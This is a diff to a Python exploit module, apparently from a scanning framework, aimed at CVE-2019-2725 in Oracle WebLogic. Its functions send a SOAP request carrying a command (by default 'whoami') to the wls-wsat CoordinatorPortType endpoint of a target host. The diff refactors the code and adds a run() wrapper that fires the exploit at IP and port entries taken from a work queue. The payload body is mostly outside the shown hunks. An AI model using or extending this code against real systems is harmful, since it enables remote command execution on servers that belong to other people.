@@ -5,8 +5,10 @@
 # by 0xn0ne
 
 from urllib.parse import urljoin
+from multiprocessing.managers import SyncManager
+from typing import Any, Dict, List, Mapping, Tuple, Union
 
-from stars import universe, Star, target_type
+from stars import target_type, Star
 from utils import http
 
 
@@ -29,7 +31,8 @@ def weblogic_10_3_6(target, cmd='whoami', force_ssl=None):
      </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body></soapenv:Body></soapenv:Envelope>'''
-    resp, data = http(urljoin(target, '/wls-wsat/CoordinatorPortType'), 'POST', data=body, headers=headers, ssl=force_ssl)
+    resp, data = http(urljoin(target, '/wls-wsat/CoordinatorPortType'),
+                      'POST', data=body, headers=headers, ssl=force_ssl)
     return resp
 
 
@@ -98,7 +101,7 @@ def weblogic_12_1_3(target, cmd='whoami', force_ssl=None):
     return resp
 
 
-@universe.groups()
+# @universe.groups()
 class CVE_2019_2725(Star):
     info = {
         'NAME': '',
@@ -112,4 +115,22 @@ class CVE_2019_2725(Star):
         if resp and resp.status_code == 200:
             return True, {'msg': 'finish.'}
         resp = weblogic_12_1_3('http://{}:{}'.format(dip, dport), force_ssl)
-        return resp and resp.status_code == 200, {'msg': 'finish.'}
+        if resp:
+            return resp.status_code == 200, {'msg': 'finish.'}
+        else:
+            return False, {'msg': 'finish.'}
+
+
+def run(queue: SyncManager.Queue, data: Dict):
+    obj = CVE_2019_2725()
+    result = {
+        'IP': data['IP'],
+        'PORT': data['PORT'],
+        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
+        'MSG': '',
+        'STATE': False
+    }
+    result['STATE'], result['MSG'] = obj.light_and_msg(
+        data['IP'], data['PORT'], data['IS_SSL'])
+
+    queue.put(result)
